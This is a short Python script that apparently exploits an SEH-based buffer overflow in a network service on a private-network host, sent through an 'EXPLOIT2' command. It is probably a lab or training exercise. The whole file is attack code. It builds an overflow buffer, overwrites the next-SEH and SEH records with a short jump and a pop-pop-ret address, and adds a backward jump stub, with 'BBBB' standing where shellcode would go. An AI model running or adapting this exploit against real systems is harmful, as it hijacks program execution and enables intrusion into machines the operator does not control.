#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
from struct import *

host="192.168.2.206"
port=7274

size = 4407

offset  = "\x90" * 100
offset += "BBBB"
offset += "A" * (size - len(offset))

nseh  = "\x90\x90" #NOPS
nseh += "\xeb\x06" #JMP short 0x08 -- Since it's instructions and not address, we don't need to care about little endian

seh = pack('<L', 0x727417EA)

# msf-nasm_shell - jmp -4407 = E9C4EEFFFF

shellcode  = "\x90" * 8
shellcode += "\xE9\xC4\xEE\xFF\xFF"
shellcode += "\x90" * 8


payload = offset + nseh + seh + shellcode

buffer = "EXPLOIT2 "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host,port))

print("Enviando " + str(len(buffer))  + "bytes")
exp.send(buffer)
print(exp.recv(1024))
exp.close()